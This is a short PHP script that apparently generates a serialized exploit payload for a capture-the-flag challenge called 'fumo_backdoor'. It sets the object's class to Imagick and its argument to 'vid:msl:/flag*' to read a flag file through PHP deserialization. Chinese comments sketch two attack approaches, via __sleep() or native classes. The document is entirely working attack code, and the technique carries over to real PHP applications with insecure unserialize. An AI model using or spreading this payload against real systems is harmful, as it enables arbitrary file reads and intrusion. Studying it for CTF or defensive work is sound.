<?php
error_reporting(0);
ini_set('open_basedir', __DIR__.":/tmp");
define("FUNC_LIST", get_defined_functions());

class fumo_backdoor
{
    public $path = null;
    public $argv = null;
    public $func = null;
    public $class = null;

}

$a = new fumo_backdoor();
$a->argv = "vid:msl:/flag*";
$a->class = "Imagick";
echo serialize($a);
//$a->argv = "/tmp/phpxZpUsG";
//// 1、思路一：触发 __sleep() 魔术方法，$a->class = fumo_backdoor();
//// 2、思路二：用 PHP 原生类解决，$a->class = Imagick;
//$a->class = "Imagick";
//echo serialize($a);

